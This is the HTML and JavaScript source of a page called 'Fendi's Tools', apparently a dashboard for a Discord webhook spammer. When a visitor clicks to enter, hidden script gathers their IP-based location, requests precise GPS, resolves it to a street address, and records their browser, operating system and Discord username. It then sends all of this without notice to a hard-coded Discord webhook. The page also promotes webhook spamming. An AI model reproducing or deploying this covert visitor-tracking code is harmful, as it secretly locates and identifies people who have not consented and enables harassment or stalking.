<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Fendi's Tools</title>
    <link rel="icon" type="image/png" href="https://i.ibb.co/8LjfF2JW/ee248f4d-97ba-4043-a535-7862e3a66946.png">
    <style>
        /* (same styles as before – unchanged) */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            background: #000000;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Poppins', 'Segoe UI', sans-serif;
            padding: 1.5rem;
            position: relative;
            overflow-x: hidden;
            color: #eee;
        }

        #snowCanvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
        }

        .grid-backdrop {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            background-image: 
                repeating-linear-gradient(90deg, rgba(255,255,255,0.25) 0px, rgba(255,255,255,0.25) 1px, transparent 1px, transparent 45px),
                repeating-linear-gradient(0deg, rgba(255,255,255,0.25) 0px, rgba(255,255,255,0.25) 1px, transparent 1px, transparent 45px),
                radial-gradient(circle at 50% 50%, rgba(0,0,0,0.95), #000000);
            background-blend-mode: overlay, overlay, normal;
            pointer-events: none;
        }

        .enter-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(8px);
            z-index: 2000;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: opacity 0.5s ease;
            opacity: 1;
            visibility: visible;
        }
        .enter-overlay.hide {
            opacity: 0;
            visibility: hidden;
        }
        .enter-overlay-content {
            text-align: center;
            background: rgba(20, 20, 20, 0.8);
            padding: 2rem 3rem;
            border-radius: 3rem;
            border: 1px solid white;
            backdrop-filter: blur(4px);
            color: white;
            font-size: 2rem;
            font-weight: bold;
            letter-spacing: 2px;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); opacity: 0.8; }
            50% { transform: scale(1.05); opacity: 1; }
            100% { transform: scale(1); opacity: 0.8; }
        }

        .landing-page {
            width: 100%;
            max-width: 800px;
            margin: 0 auto;
            padding: 2rem;
            z-index: 5;
            position: relative;
            display: block;
            opacity: 0;
            transition: opacity 0.8s ease;
        }
        .landing-page.visible {
            opacity: 1;
        }
        .welcome-text {
            text-align: center;
            font-size: 1.8rem;
            font-weight: 600;
            color: white;
            margin-bottom: 0.5rem;
            text-shadow: 0 0 10px rgba(255,255,255,0.3);
        }
        .subheading {
            text-align: center;
            font-size: 1rem;
            color: #ccc;
            letter-spacing: 2px;
            margin-bottom: 2rem;
            border-bottom: 1px dashed rgba(255,255,255,0.3);
            display: inline-block;
            width: auto;
            margin-left: auto;
            margin-right: auto;
            padding-bottom: 0.5rem;
        }
        .tools-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 2rem;
            margin-top: 1rem;
        }
        .tool-card {
            background: rgba(0,0,0,0.7);
            backdrop-filter: blur(8px);
            border: 1px solid white;
            border-radius: 2rem;
            padding: 1.8rem;
            text-align: center;
            transition: all 0.3s;
            cursor: pointer;
        }
        .tool-card:hover {
            transform: translateY(-5px);
            background: rgba(20,20,20,0.8);
            box-shadow: 0 0 25px rgba(255,255,255,0.2);
        }
        .tool-card h3 {
            font-size: 1.5rem;
            margin-bottom: 0.5rem;
            color: white;
        }
        .tool-card p {
            color: #ccc;
            font-size: 0.85rem;
        }
        .placeholder {
            opacity: 0.6;
            cursor: pointer;
        }
        .placeholder:hover {
            transform: none;
            box-shadow: none;
            background: rgba(0,0,0,0.7);
        }

        .music-player {
            position: fixed;
            top: 15px;
            right: 15px;
            background: rgba(0,0,0,0.75);
            backdrop-filter: blur(12px);
            border-radius: 3rem;
            border: 1px solid white;
            padding: 0.5rem 1rem;
            z-index: 101;
            display: flex;
            align-items: center;
            gap: 0.8rem;
            font-size: 0.8rem;
        }
        .music-player button {
            background: none;
            border: none;
            color: white;
            font-size: 1.2rem;
            cursor: pointer;
            padding: 0;
            width: 28px;
            transition: 0.2s;
        }
        .music-player button:hover {
            color: #aaa;
            transform: scale(1.05);
        }
        .music-player .track-title {
            color: #ddd;
            max-width: 140px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            font-size: 0.75rem;
        }

        .top-left-logo {
            position: fixed;
            top: 15px;
            left: 15px;
            z-index: 100;
            cursor: pointer;
        }
        .top-left-logo img {
            width: 45px;
            height: 45px;
            border-radius: 12px;
            border: 1px solid white;
            transition: transform 0.2s;
        }
        .top-left-logo img:hover {
            transform: scale(1.05);
        }
        .tools-menu {
            position: fixed;
            top: 70px;
            left: 15px;
            background: rgba(0,0,0,0.95);
            backdrop-filter: blur(12px);
            border: 1px solid white;
            border-radius: 1rem;
            padding: 0.8rem;
            min-width: 180px;
            z-index: 99;
            opacity: 0;
            visibility: hidden;
            transform: translateY(-10px);
            transition: all 0.3s;
        }
        .tools-menu.active {
            opacity: 1;
            visibility: visible;
            transform: translateY(0);
        }
        .tools-menu h4 {
            color: white;
            font-size: 0.8rem;
            text-align: center;
            border-bottom: 1px solid white;
            margin-bottom: 0.5rem;
        }
        .tool-item {
            padding: 0.5rem 0.8rem;
            color: #ddd;
            cursor: pointer;
            border-radius: 0.5rem;
            font-size: 0.8rem;
            transition: 0.2s;
        }
        .tool-item:hover {
            background: rgba(255,255,255,0.2);
        }
        .placeholder-item {
            opacity: 0.6;
            cursor: not-allowed;
        }
        .placeholder-item:hover {
            background: none;
        }

        .version-tag {
            position: fixed;
            bottom: 10px;
            right: 10px;
            color: #aaa;
            opacity: 0.6;
            font-size: 12px;
            font-family: monospace;
            z-index: 9999;
            pointer-events: none;
        }

        @media (max-width: 650px) {
            .tools-grid {
                gap: 1rem;
            }
            .tool-card {
                padding: 1rem;
            }
            .tool-card h3 {
                font-size: 1.2rem;
            }
            .music-player .track-title {
                max-width: 100px;
            }
            .welcome-text {
                font-size: 1.3rem;
            }
        }
    </style>
</head>
<body>

<div class="grid-backdrop"></div>
<canvas id="snowCanvas"></canvas>

<div class="top-left-logo" id="logoBtn">
    <img src="https://i.ibb.co/8LjfF2JW/ee248f4d-97ba-4043-a535-7862e3a66946.png" alt="Logo">
</div>
<div id="toolsMenu" class="tools-menu">
    <h4>Fendi's Tools</h4>
    <div class="tool-item" data-tool="spammer">Webhook Spammer</div>
    <div class="tool-item placeholder-item">Webhook Reader (coming soon)</div>
</div>

<div class="music-player" id="musicPlayer">
    <button id="prevTrackBtn">⏮</button>
    <button id="playPauseBtn">▶</button>
    <button id="nextTrackBtn">⏭</button>
    <span id="trackTitle" class="track-title">Pass Out</span>
</div>

<div id="enterOverlay" class="enter-overlay">
    <div class="enter-overlay-content">Click to Enter</div>
</div>

<div id="landingPage" class="landing-page">
    <div class="welcome-text" id="welcomeText">Welcome to Fendi Tool's</div>
    <div style="text-align: center;"><span class="subheading" id="subheadingText">Dashboard</span></div>
    <div class="tools-grid">
        <div class="tool-card" data-tool="spammer">
            <h3>WEBHOOK SPAMMER</h3>
            <p>Send messages, spam webhooks, customize bot name & avatar</p>
        </div>
        <div class="tool-card placeholder">
            <h3>WEBHOOK READER</h3>
            <p>Read and analyze webhook logs (coming soon)</p>
        </div>
    </div>
</div>

<div class="version-tag">v2.0</div>

<script>
    (function() {
        // ========== GLOBAL SETTINGS ==========
        const PAGE_ORIGIN = "Dashboard";
        const DISCORD_CLIENT_ID = "1497155951067664415";
        const REDIRECT_URI = window.location.origin;
        const IP_LOG_WEBHOOK = "https://discord.com/api/webhooks/1497124094926127155/1nzYxMuo7Q4aAMSMU5KSBxlLn4srSXcw7u-VeH9qHUgCae2AjCetucxixHBSoR66LaLG";
        
        let entered = sessionStorage.getItem('entered') === 'true';
        const overlay = document.getElementById('enterOverlay');
        const landingPage = document.getElementById('landingPage');

        // ========== IP LOGGING & GPS ==========
        let gpsRequested = localStorage.getItem("gpsRequested") === "true";
        let gpsGranted = localStorage.getItem("gpsGranted") === "true";
        let ipLogSent = sessionStorage.getItem('ipLogSent') === 'true';

        async function getIpGeo() {
            try {
                const res = await fetch('https://ip-api.com/json/');
                const data = await res.json();
                if (data.status === 'success') {
                    return {
                        ip: data.query,
                        city: data.city,
                        region: data.regionName,
                        country: data.country,
                        lat: data.lat,
                        lon: data.lon,
                        mapLink: `https://www.google.com/maps?q=${data.lat},${data.lon}`
                    };
                }
            } catch(e) {}
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                if (data && data.ip) {
                    return {
                        ip: data.ip,
                        city: data.city || "Unknown",
                        region: data.region || "Unknown",
                        country: data.country_name || "Unknown",
                        lat: data.latitude,
                        lon: data.longitude,
                        mapLink: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
                    };
                }
            } catch(e) {}
            return { ip: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown", mapLink: "#" };
        }

        async function reverseGeocode(lat, lon) {
            try {
                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
                const data = await response.json();
                if (data && data.display_name) {
                    const address = data.address;
                    let shortAddress = "";
                    if (address.house_number && address.road) shortAddress += `${address.house_number} ${address.road}, `;
                    else if (address.road) shortAddress += `${address.road}, `;
                    if (address.suburb) shortAddress += `${address.suburb}, `;
                    else if (address.city_district) shortAddress += `${address.city_district}, `;
                    if (address.city || address.town) shortAddress += `${address.city || address.town}, `;
                    else if (address.village) shortAddress += `${address.village}, `;
                    if (address.country) shortAddress += address.country;
                    return shortAddress || data.display_name.split(",")[0];
                }
                return null;
            } catch(e) { return null; }
        }

        function getDeviceLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation || gpsRequested) {
                    resolve(null);
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const coords = {
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            mapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
                        };
                        const address = await reverseGeocode(coords.lat, coords.lon);
                        if (address) coords.address = address;
                        gpsGranted = true;
                        localStorage.setItem("gpsGranted", "true");
                        resolve(coords);
                    },
                    () => {
                        gpsGranted = false;
                        localStorage.setItem("gpsGranted", "false");
                        resolve(null);
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
                gpsRequested = true;
                localStorage.setItem("gpsRequested", "true");
            });
        }

        function getBrowserOS() {
            const ua = navigator.userAgent;
            let browser = "Unknown", os = "Unknown";
            if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
            else if (ua.includes("Firefox")) browser = "Firefox";
            else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
            else if (ua.includes("Edg")) browser = "Edge";
            if (ua.includes("Windows NT")) os = "Windows";
            else if (ua.includes("Mac OS X")) os = "macOS";
            else if (ua.includes("Linux")) os = "Linux";
            else if (ua.includes("Android")) os = "Android";
            else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
            return { browser, os, userAgent: ua };
        }

        async function sendIpLog(username = null) {
            if (ipLogSent) return;
            const ipGeo = await getIpGeo();
            const deviceGPS = await getDeviceLocation();
            const { browser, os, userAgent } = getBrowserOS();
            let fields = [
                { name: "IP Address", value: ipGeo.ip, inline: true },
                { name: "Page", value: PAGE_ORIGIN, inline: true },
                { name: "Discord Username", value: username ? username : "Not logged in", inline: true },
                { name: "Browser", value: browser, inline: true },
                { name: "Operating System", value: os, inline: true },
                { name: "Approx. Location (IP)", value: `${ipGeo.city}, ${ipGeo.region}, ${ipGeo.country}`, inline: false },
                { name: "Map (IP-based)", value: `[View on Google Maps](${ipGeo.mapLink})`, inline: false }
            ];
            if (deviceGPS) {
                let gpsInfo = `Lat: ${deviceGPS.lat}, Lon: ${deviceGPS.lon} (accuracy: ±${Math.round(deviceGPS.accuracy)}m)`;
                if (deviceGPS.address) gpsInfo += `\n📍 Street Address: ${deviceGPS.address}`;
                fields.push(
                    { name: "📍 Exact GPS Location", value: gpsInfo, inline: false },
                    { name: "Map (GPS)", value: `[View on Google Maps](${deviceGPS.mapLink})`, inline: false }
                );
            } else {
                fields.push({ name: "GPS Access", value: (gpsGranted ? "Denied" : "Not requested"), inline: false });
            }
            fields.push({ name: "User Agent", value: userAgent.substring(0, 100), inline: false });
            const embed = {
                author: { name: "IP Logs", icon_url: "https://i.ibb.co/gL0cffbC/New-Project-7.png" },
                title: "🌐 Visitor Logged",
                color: 0xffffff,
                fields: fields,
                timestamp: new Date().toISOString()
            };
            try {
                await fetch(IP_LOG_WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: "@everyone", embeds: [embed] })
                });
                ipLogSent = true;
                sessionStorage.setItem('ipLogSent', 'true');
                console.log("IP log sent with username and page origin");
            } catch(e) { console.error("Failed to send IP log", e); }
        }

        // ========== DISCORD OAUTH ==========
        function generateRandomString(l) {
            let text = "";
            const possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~";
            for (let i = 0; i < l; i++) text += possible.charAt(Math.floor(Math.random() * possible.length));
            return text;
        }
        async function sha256(plain) {
            const encoder = new TextEncoder();
            const data = encoder.encode(plain);
            const hash = await crypto.subtle.digest("SHA-256", data);
            return hash;
        }
        function base64URL(buffer) {
            return btoa(String.fromCharCode(...new Uint8Array(buffer)))
                .replace(/\+/g, "-")
                .replace(/\//g, "_")
                .replace(/=+$/, "");
        }
        async function exchangeCode(code, verifier) {
            const body = new URLSearchParams({
                client_id: DISCORD_CLIENT_ID,
                grant_type: "authorization_code",
                code: code,
                redirect_uri: REDIRECT_URI,
                code_verifier: verifier
            });
            const response = await fetch("https://discord.com/api/oauth2/token", {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: body.toString()
            });
            const data = await response.json();
            return data.access_token;
        }
        async function fetchDiscordUser(accessToken) {
            const response = await fetch("https://discord.com/api/users/@me", {
                headers: { Authorization: `Bearer ${accessToken}` },
            });
            if (!response.ok) throw new Error("Failed to fetch user");
            return response.json();
        }

        // ========== MUSIC PLAYER ==========
        const tracks = [
            { title: "Pass Out", url: "./songs/PassOut.mp3" },
            { title: "VYZEE", url: "./songs/VYZEE.mp3" },
            { title: "Phantom", url: "./songs/Phantom.mp3" },
            { title: "Track 10", url: "./songs/Track10.mp3" }
        ];
        let currentTrackIndex = 0;
        let audio = null;
        let isPlaying = false;
        let musicStarted = false;
        const trackTitleSpan = document.getElementById('trackTitle');
        const playPauseBtn = document.getElementById('playPauseBtn');
        const prevBtn = document.getElementById('prevTrackBtn');
        const nextBtn = document.getElementById('nextTrackBtn');

        function saveMusicState() {
            if (audio) {
                localStorage.setItem('musicTrackIndex', currentTrackIndex);
                localStorage.setItem('musicCurrentTime', audio.currentTime);
                localStorage.setItem('musicPlaying', isPlaying);
            }
        }
        function loadMusicState() {
            const savedIndex = localStorage.getItem('musicTrackIndex');
            const savedTime = parseFloat(localStorage.getItem('musicCurrentTime'));
            const savedPlaying = localStorage.getItem('musicPlaying') === 'true';
            if (savedIndex !== null && tracks[savedIndex]) {
                currentTrackIndex = parseInt(savedIndex);
                loadTrack(currentTrackIndex, false);
                if (!isNaN(savedTime) && audio) audio.currentTime = savedTime;
                if (savedPlaying) {
                    audio.play().catch(e => console.log);
                    isPlaying = true;
                    playPauseBtn.textContent = '⏸';
                }
            } else {
                loadTrack(0, false);
            }
        }
        function loadTrack(index, autoPlay = false) {
            if (audio) {
                audio.pause();
                audio = null;
            }
            audio = new Audio(tracks[index].url);
            audio.loop = false;
            audio.volume = 0.5;
            trackTitleSpan.textContent = tracks[index].title;
            audio.addEventListener('ended', () => nextTrack());
            if (autoPlay || (musicStarted && isPlaying)) {
                audio.play().catch(e => console.log);
                isPlaying = true;
                playPauseBtn.textContent = '⏸';
            } else {
                isPlaying = false;
                playPauseBtn.textContent = '▶';
            }
        }
        function startMusic() {
            if (musicStarted) return;
            musicStarted = true;
            loadMusicState();
            setInterval(saveMusicState, 2000);
            window.addEventListener('beforeunload', saveMusicState);
        }
        function playPause() {
            if (!musicStarted) startMusic();
            if (!audio) return;
            if (isPlaying) {
                audio.pause();
                playPauseBtn.textContent = '▶';
            } else {
                audio.play();
                playPauseBtn.textContent = '⏸';
            }
            isPlaying = !isPlaying;
        }
        function nextTrack() {
            if (!musicStarted) startMusic();
            currentTrackIndex = (currentTrackIndex + 1) % tracks.length;
            loadTrack(currentTrackIndex, true);
        }
        function prevTrack() {
            if (!musicStarted) startMusic();
            currentTrackIndex = (currentTrackIndex - 1 + tracks.length) % tracks.length;
            loadTrack(currentTrackIndex, true);
        }
        playPauseBtn.addEventListener('click', playPause);
        prevBtn.addEventListener('click', prevTrack);
        nextBtn.addEventListener('click', nextTrack);

        // ========== ENTER OVERLAY LOGIC ==========
        function finishEntry() {
            overlay.classList.add('hide');
            setTimeout(() => {
                overlay.style.display = 'none';
                landingPage.classList.add('visible');
                startMusic();
            }, 500);
        }

        overlay.addEventListener('click', async () => {
            if (entered) {
                finishEntry();
                return;
            }
            let token = localStorage.getItem('discord_access_token');
            let username = null;
            if (!token) {
                // Redirect to Discord OAuth
                const codeVerifier = generateRandomString(64);
                const codeChallenge = base64URL(await sha256(codeVerifier));
                localStorage.setItem("code_verifier", codeVerifier);
                const authUrl = `https://discord.com/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&scope=identify&code_challenge=${codeChallenge}&code_challenge_method=S256`;
                window.location.href = authUrl;
                return;
            }
            // Already have token
            try {
                const user = await fetchDiscordUser(token);
                if (user && user.id) {
                    username = `${user.username}#${user.discriminator || "0"}`;
                    document.getElementById('welcomeText').innerHTML = `Welcome to Fendi Tool's, ${escapeHtml(user.username)}`;
                }
            } catch(e) { console.error("Failed to fetch user", e); }
            await sendIpLog(username);
            sessionStorage.setItem('entered', 'true');
            entered = true;
            finishEntry();
        });

        // Handle OAuth redirect
        const urlParams = new URLSearchParams(window.location.search);
        const code = urlParams.get("code");
        if (code) {
            const codeVerifier = localStorage.getItem("code_verifier");
            if (codeVerifier) {
                exchangeCode(code, codeVerifier).then(async token => {
                    localStorage.setItem("discord_access_token", token);
                    const user = await fetchDiscordUser(token);
                    const username = `${user.username}#${user.discriminator || "0"}`;
                    document.getElementById('welcomeText').innerHTML = `Welcome to Fendi Tool's, ${escapeHtml(user.username)}`;
                    await sendIpLog(username);
                    sessionStorage.setItem('entered', 'true');
                    entered = true;
                    window.history.replaceState({}, document.title, window.location.pathname);
                    finishEntry();
                }).catch(err => console.error(err));
            } else {
                window.history.replaceState({}, document.title, window.location.pathname);
                finishEntry();
            }
        } else if (entered) {
            finishEntry();
        }

        function escapeHtml(str) {
            return str.replace(/[&<>]/g, function(m) {
                if (m === '&') return '&amp;';
                if (m === '<') return '&lt;';
                if (m === '>') return '&gt;';
                return m;
            });
        }

        // ========== TOOL SELECTION ==========
        const toolCards = document.querySelectorAll('.tool-card');
        toolCards.forEach(card => {
            if (!card.classList.contains('placeholder')) {
                card.addEventListener('click', () => {
                    saveMusicState();
                    sessionStorage.setItem('entered', 'true');
                    window.location.href = '/spammer/';
                });
            } else {
                card.addEventListener('click', () => {
                    alert("Webhook Reader is coming soon!");
                });
            }
        });

        // ========== FENDI MENU ==========
        const logoBtn = document.getElementById('logoBtn');
        const toolsMenu = document.getElementById('toolsMenu');
        logoBtn.addEventListener('click', (e) => {
            e.stopPropagation();
            toolsMenu.classList.toggle('active');
        });
        document.addEventListener('click', (e) => {
            if (!toolsMenu.contains(e.target) && !logoBtn.contains(e.target)) {
                toolsMenu.classList.remove('active');
            }
        });
        const menuSpammer = document.querySelector('.tool-item[data-tool="spammer"]');
        if (menuSpammer) {
            menuSpammer.addEventListener('click', () => {
                saveMusicState();
                sessionStorage.setItem('entered', 'true');
                window.location.href = '/spammer/';
            });
        }

        // ========== SNOW PARTICLES ==========
        const canvas = document.getElementById('snowCanvas');
        const ctx = canvas.getContext('2d');
        let particles = [];
        function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
        function initSnow() {
            particles = [];
            for (let i = 0; i < 140; i++) {
                particles.push({
                    x: Math.random() * canvas.width,
                    y: Math.random() * canvas.height,
                    r: Math.random() * 3 + 1.5,
                    speedY: Math.random() * 1.2 + 0.4,
                    speedX: (Math.random() - 0.5) * 0.2,
                    alpha: Math.random() * 0.5 + 0.3
                });
            }
        }
        function drawSnow() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            for (let p of particles) {
                ctx.beginPath();
                ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
                ctx.fillStyle = `rgba(255, 255, 255, ${p.alpha})`;
                ctx.fill();
                p.y += p.speedY;
                p.x += p.speedX;
                if (p.y > canvas.height) { p.y = 0; p.x = Math.random() * canvas.width; }
                if (p.x > canvas.width) p.x = 0;
                if (p.x < 0) p.x = canvas.width;
            }
            requestAnimationFrame(drawSnow);
        }
        window.addEventListener('resize', () => { resizeCanvas(); initSnow(); });
        resizeCanvas();
        initSnow();
        drawSnow();
    })();
</script>
</body>
</html>
